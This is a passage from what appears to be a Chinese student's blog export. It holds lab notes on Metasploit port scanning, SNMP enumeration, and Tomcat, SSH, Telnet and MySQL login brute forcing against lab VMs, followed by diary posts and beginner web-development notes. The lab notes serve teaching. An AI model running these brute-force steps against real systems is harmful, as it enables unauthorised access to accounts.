<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/portscan/ack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看其它选项：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置靶机地址：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置线程为 20：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set threads 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>开始扫描：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>观察当使用 ACK 扫描时，扫描的结果跟 TCP 和 UDP 扫描的方式有什么不同。</p>
<h1 id="实验44-Metasploit-tomcat爆破实验"><a href="#实验44-Metasploit-tomcat爆破实验" class="headerlink" title="实验44 Metasploit-tomcat爆破实验"></a>实验44 Metasploit-tomcat爆破实验</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用 metasploit 去爆破 Tomcat 的登录密码，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：kali 2016<br>靶机：centos 6.9</p>
<p><strong>实验工具</strong></p>
<p>Metasploit, Tomcat</p>
<p><strong>实验目的</strong></p>
<p>使用 Metasploit 下的 tomcat 爆破模块对 Tomcat 账户进行爆破</p>
<h2 id="实验步骤-30"><a href="#实验步骤-30" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在kali虚拟机上测试与靶机的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.137 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在靶机 centos 上测试与 kali 的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.127.138 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>在 kali 上启动 Metasploit：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>搜索有效的 Tomcat 模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>这里选择使用模块 <code>auxiliary/scanner/http/tomcat_mgr_login</code>：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/http/tomcat_mgr_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看 tomcat_mgr_login 模块有效选项：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>指定用户名和密码文件，这里使用默认路径：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set user_file /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
set pass_file /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p>指定要攻击的目标服务器：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rhosts 192.168.127.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置服务器端口号为 8080：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set rport 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置当渗透成功时停止：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set stop_on_success true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>运行攻击爆破成功密码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握 Metasploit 下 tomcat 爆破方法的使用，对比 medusa 爆破速度上的区别。</p>
<h1 id="实验-45-路由信息探测-Traceroute"><a href="#实验-45-路由信息探测-Traceroute" class="headerlink" title="实验 45 路由信息探测-Traceroute"></a>实验 45 路由信息探测-Traceroute</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Traceroute 工具，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：Kali 2016</p>
<p><strong>实验工具</strong></p>
<p>traceroute</p>
<p><strong>实验目的</strong></p>
<p>了解路由的概念和工作原理，掌握 Linux 下探测路由工具 Traceroute 的使用方法。</p>
<h2 id="实验步骤-31"><a href="#实验步骤-31" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>路由是信息从源穿过网络传递到目的地的行为，在传播路径中至少经过一个中间节点。Traceroute 通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备 Traceroute 要测 3 次。输出结果中包括每次测试的时间（ms）和设备的名称（如有的话）及其 IP 地址。</p>
</li>
<li><p>打开 Linux 终端，输入 <code>traceroute</code>，查看使用语法。</p>
</li>
<li><p>查看本机 IP 地址：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ifconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用 Traceroute 来追踪本机的路由：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute &lt;本机IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>把探测包的个数设置为值 8：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute -q 8 &lt;目标IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>探测包使用的基本 UDP 端口设置为 6888：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute -p 6888 &lt;目标IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>跳数设置：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute -m 15 &lt;目标IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>把对外发探测包的等待响应时间设置为 3 秒：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">traceroute -w 3 &lt;目标IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>掌握使用 Traceroute 工具去探测路由信息。</p>
<h1 id="实验46-Metasploit之SNMP信息扫描"><a href="#实验46-Metasploit之SNMP信息扫描" class="headerlink" title="实验46 Metasploit之SNMP信息扫描"></a>实验46 Metasploit之SNMP信息扫描</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 SNMP 扫描，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：Kali 2016<br>靶机：待补充</p>
<p><strong>实验工具</strong></p>
<p>Metasploit, SNMP</p>
<p><strong>实验目的</strong></p>
<p>在 Metasploit 中利用 SNMP 进行信息扫描。</p>
<h2 id="实验步骤-32"><a href="#实验步骤-32" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在 Kali 终端中启动 Metasploit：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>搜索当前系统内可用 SNMP 扫描模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search snmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用 SNMP 扫描模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/snmp/snmp_enum<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看该模块的有效选项：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置扫描范围：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set RHOSTS 192.168.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>设置扫描线程：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set THREADS 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用 <code>run</code> 或 <code>exploit</code> 开始运行扫描：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>在设置必选项目外其它的一些非必选项看看是什么意思。</p>
<h1 id="实验47-Metasploit之利用nmap扫描端口"><a href="#实验47-Metasploit之利用nmap扫描端口" class="headerlink" title="实验47 Metasploit之利用nmap扫描端口"></a>实验47 Metasploit之利用nmap扫描端口</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 nmap 扫描，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：Kali 2016<br>靶机：待补充</p>
<p><strong>实验工具</strong></p>
<p>Metasploit</p>
<p><strong>实验目的</strong></p>
<p>在 Metasploit 中利用 nmap 扫描端口。</p>
<h2 id="实验步骤-33"><a href="#实验步骤-33" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在 Kali 终端中启动 Metasploit：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>检查 Metasploit 数据库是否启动（Kali 需要手动启动 PostgreSQL 数据库）：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">db_status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>载入追踪者插件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">load db_tracker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>启动 nmap 扫描并将结果存进数据库：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">db_nmap –sV –O –v –T 5 192.168.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看扫描过的主机，可以看到已经识别出的操作系统：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>在 Metasploit 下的 nmap 扫描和在终端下的 nmap 扫描结果是否一样。</p>
<h1 id="实验48-Metasploit之SSH爆破模块"><a href="#实验48-Metasploit之SSH爆破模块" class="headerlink" title="实验48 Metasploit之SSH爆破模块"></a>实验48 Metasploit之SSH爆破模块</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 SSH 爆破，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：Kali 2016<br>靶机：待补充</p>
<p><strong>实验工具</strong></p>
<p>Metasploit</p>
<p><strong>实验目的</strong></p>
<p>掌握 Metasploit 下 SSH 爆破模</p>
<p>块的使用。</p>
<h2 id="实验步骤-34"><a href="#实验步骤-34" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在 Kali 虚拟机上启动 msfconsole 控制台并测试与靶机的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.1.1 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用命令搜索 SSH 登录相关的模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search ssh_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>利用 SSH 爆破模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/ssh/ssh_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看在该模块下需要设置的参数：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>根据提示使用 <code>set</code> 语句填写必填参数，例如远程地址、爆破用户名字典、爆破密码字典。可选参数根据需要填写：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set RHOSTS 192.168.1.1
set USER_FILE /path/to/usernames.txt
set PASS_FILE /path/to/passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>发起攻击：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>成功爆破得到 SSH 用户名和密码，进行结果验证：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh &lt;target_address&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>在 Metasploit 框架下的 SSH 爆破相比 Medusa 是否更具有优势。</p>
<h1 id="实验49-Metasploit-Telnet爆破"><a href="#实验49-Metasploit-Telnet爆破" class="headerlink" title="实验49 Metasploit-Telnet爆破"></a>实验49 Metasploit-Telnet爆破</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 Telnet 爆破，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：Kali 2016<br>靶机：待补充</p>
<p><strong>实验工具</strong></p>
<p>Metasploit</p>
<p><strong>实验目的</strong></p>
<p>掌握 Metasploit 下 Telnet 爆破模块的使用。</p>
<h2 id="实验步骤-35"><a href="#实验步骤-35" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在 Kali 虚拟机上启动 msfconsole 控制台并测试与靶机的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.1.1 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用命令搜索 Telnet 登录相关的模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search telnet_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>利用 Telnet 爆破模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/telnet/telnet_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看在该模块下需要设置的参数：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>根据提示使用 <code>set</code> 语句填写必填参数，例如远程地址、爆破用户名字典、爆破密码字典。可选参数根据需要填写：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set RHOSTS 192.168.1.1
set USER_FILE /path/to/usernames.txt
set PASS_FILE /path/to/passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>发起攻击：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>成功爆破得到 Telnet 用户名和密码，进行结果验证：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">telnet &lt;target_address&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>思考在设置爆破进程数的时候如何考虑进程大小。</p>
<h1 id="实验50-Metasploit-Mysql爆破"><a href="#实验50-Metasploit-Mysql爆破" class="headerlink" title="实验50 Metasploit-Mysql爆破"></a>实验50 Metasploit-Mysql爆破</h1><p><strong>实验场景</strong></p>
<p>小明是网络工程师，某天他收到上级领导命令，需要在 Kali 服务器使用 Metasploit 工具下的 MySQL 爆破，为避免在部署时出现问题，小明首先在自己的虚拟机上搭建一遍环境。</p>
<p><strong>实验环境</strong></p>
<p>攻击机：Kali 2016<br>靶机：待补充</p>
<p><strong>实验工具</strong></p>
<p>Metasploit</p>
<p><strong>实验目的</strong></p>
<p>掌握 Metasploit 下 MySQL 爆破模块的使用。</p>
<h2 id="实验步骤-36"><a href="#实验步骤-36" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
<li><p>在 Kali 虚拟机上启动 msfconsole 控制台并测试与靶机的连通性：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping 192.168.1.1 -c 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用命令搜索 MySQL 登录相关的模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search mysql_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>利用 MySQL 爆破模块：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/mysql/mysql_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>查看在该模块下需要设置的参数：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>根据提示使用 <code>set</code> 语句填写必填参数，例如远程地址、爆破用户名字典、爆破密码字典。可选参数根据需要填写：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set RHOSTS 192.168.1.1
set USER_FILE /path/to/usernames.txt
set PASS_FILE /path/to/passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>发起攻击：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>成功爆破得到 MySQL 用户名和密码，进行结果验证：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql -h &lt;target_address&gt; -u &lt;username&gt; -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>实验总结</strong></p>
<p>思考 MySQL 爆破日志，在数据库日志文件能不能查看。</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>小小修整</title>
    <url>/2024/01/15/%E5%B0%8F%E5%B0%8F%E4%BF%AE%E6%95%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="首先是-新年快乐"><a href="#首先是-新年快乐" class="headerlink" title="首先是 新年快乐"></a>首先是 新年快乐</h1><p>这几天去南京旅游了 主要是为了放松<br>因此没更新<br>现在回来了<br>接下来要干的事：<br><strong>把笔记本改造成自己的便捷平台<br>通过按照月份分类来整理有些过多的文章<br>作业 看书 多学 老生常谈</strong></p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>维修时间</title>
    <url>/2024/01/28/%E2%80%9C%E7%BB%B4%E4%BF%AE%E6%97%B6%E9%97%B4%E2%80%9D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h1><p>网络不知道为啥寄了<br>speedtest变成了随机数生成器 5mb 200mb 400mb里上下蹦跳<br>首先怀疑的是<strong>墙内内嵌的网线老化导致网速不行</strong><br>然后拿了一根<strong>40m长</strong>的网线直连了<br>结果还是不行<br>dns也没毛病<br>结果是<strong>msi center</strong>限制了我的网速<br><a href="https://blog.csdn.net/qq_37296622/article/details/123959244#">相同的案例</a><br>教训是 少下捆绑 硬件相关的软件 尤其是在更新时注意是否有“新功能” </p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>日常牢骚</tag>
      </tags>
  </entry>
  <entry>
    <title>复习time</title>
    <url>/2024/02/27/%E5%A4%8D%E4%B9%A0time/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="高三了进行一个前端（html-css-javascript）的复习"><a href="#高三了进行一个前端（html-css-javascript）的复习" class="headerlink" title="高三了进行一个前端（html+css+javascript）的复习"></a>高三了进行一个前端（html+css+javascript）的复习</h1><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><blockquote>
<p>“超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。<br>您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。”</p>
</blockquote>
<p><strong>基础构造</strong></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
    	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>元素名用尖括号包裹<br> 以<code>&lt;元素名&gt;元素内容&lt;/元素名&gt;</code>或<code>&lt;元素名 /&gt;</code>作为一部分组成的代码<br>注释形式为<code>&lt;!--这是一个注释，注释在浏览器中不会显示--&gt;</code></p>
<h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><blockquote>
<p>“<strong>CSS</strong> (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言，<strong>CSS</strong> 文件扩展名为 <strong>.css</strong>。<br>通过使用 <strong>CSS</strong> 我们可以大大提升网页开发的工作效率！”</p>
</blockquote>
<span id="more"></span>
<p><strong>基础构造</strong></p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">{</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span>#d0e4fe<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">h1</span> <span class="token punctuation">{</span>
    <span class="token property">color</span><span class="token punctuation">:</span>orange<span class="token punctuation">;</span>
    <span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token selector">p</span> <span class="token punctuation">{</span>
    <span class="token property">font-family</span><span class="token punctuation">:</span><span class="token string">"Times New Roman"</span><span class="token punctuation">;</span>
    <span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
👆在html中直接编译可以使用&lt;style&gt;标签
又或者使用 &lt;link rel=<span class="token string">"stylesheet"</span> href=<span class="token string">"style.css"</span>&gt;
这样便可以多个网页复用一个css文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先声明需要更改的元素 （例如body）<br>然后用大括号 里面加上属性 随后加冒号 声明属性的值 随后以分号收尾<br>除了直接更改元素 还可以使用选择器</p>
<pre class="line-numbers language-css+html" data-language="css+html"><code class="language-css+html">#para1
{
	text-align:center;
	color:red;
} 
👆CSS 中id 选择器以 "#" 来定义
&lt;p id="para1"&gt;Hello World!&lt;/p&gt;
👆这个段落就会受到居中和红色字体的影响<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.center</span>
<span class="token punctuation">{</span>
	<span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
👆在 CSS 中类选择器以一个点.号显示
&lt;h1 class=<span class="token string">"center"</span>&gt;标题居中&lt;/h1&gt;
&lt;p class=<span class="token string">"center"</span>&gt;段落居中。&lt;/p&gt; 
👆这些元素就会受到居中影响<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">p.center</span>
<span class="token punctuation">{</span>
	<span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
👆在.号前加上元素名 就能限制选择器的范围
&lt;h1 class=<span class="token string">"center"</span>&gt;这个标题不受影响&lt;/h1&gt;
&lt;p class=<span class="token string">"center"</span>&gt;这个段落居中对齐。&lt;/p&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注释方式是<code>/*这里是注释的内容*/</code></p>
<h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p>还在自学 打点草稿上来 1.javascript对大小写敏感<br>2.输出方式很多<br>(1)浏览器的f12 - 控制台中测试<br>(2)html文件<code>&lt;script&gt;</code>元素之间</p>
<p>总之先把现在懂的代码列出来吧<br>(1)var 变量名=’变量内容’ //定义变量<br>(2)字符需要加“”或者’‘ 不然被看做变量<br>(3)console.log(“这些文字”) //让该网页的控制台中输出这些文字<br>(4)<code>单行注释 //</code><br>(5)<code>/*多行注释*/</code><br>(6)申明函数（类似于python）<br>    function 函数名称（可选的变量项1，变量项2）{<br>    代码内容<br>    }<br>(7) return x; 输出变量x的值 多用于函数结尾<br>(8) 加在元素的标签内 例如下文中的onclick 点击后通过替换demo中的内容来实现报时<br><code>&lt;button onclick="getElementById('demo').innerHTML=Date()"&gt;现在的时间是?&lt;/button&gt;</code><br><code>&lt;p id="demo"&gt;&lt;/p&gt;</code><br><a href="https://www.runoob.com/jsref/dom-obj-event.html">https://www.runoob.com/jsref/dom-obj-event.html</a><br>至于事件可以看这里👆</p>
<p>(9)至于元素和.后边的相互关系目前未知<br>(10)输出方式很多<br>使用document.write()将内容写入到html中<br>使用console.log()在f12里的console生成信息<br>使用window.alert()弹出警告框<br>用id属性标识某个元素 然后使用document.getElementById(“demo”).innerHTML=”想要加入的内容”<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML">https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML</a><br>很酷<br>vue.js<br>(11)变量在赋值之前都是undefined</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>开学季</title>
    <url>/2024/02/25/%E5%BC%80%E5%AD%A6%E5%AD%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>开学了<br>离大考只剩两 三个月了<br>照常会把课程内容记录下来</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>日常牢骚</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf实战相关1</title>
    <url>/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/</url>
